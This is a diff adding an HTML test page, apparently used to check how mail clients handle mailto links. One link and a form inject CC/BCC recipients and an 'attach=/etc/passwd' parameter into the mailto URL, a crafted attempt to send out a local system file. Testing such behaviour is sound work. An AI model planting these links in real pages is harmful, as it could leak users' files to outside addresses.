@@ -1,0 +1,18 @@
+<html>
+<head>
+ <title>Email Link Test</title>
+</head>
+<body>
+<a href="mailto:joe@xyz.com&amp;CC=bob@xyz.com&amp;BCC=bob@xyz.com&amp;attach=%2Fetc%2Fpasswd&amp;subject=hello&amp;body=hello">Send Email - A</a>
+<br/>
+<a href="mailto:joe@xyz.com">Send Email - B</a>
+<br/><br/>
+<form action="mailto:someone@example.com?CC='bob@example.com&amp;attach=%2fetc%2fpasswd&amp;body=" method="post" enctype="application/x-www-form-urlencoded">
+Choose file to upload:<br />
+<input type="file" name="upload_file" size="20" />
+<br />
+<input type="submit" value="Send" />
+<input type="reset" value="Reset" />
+</form>
+</body>
+</html>
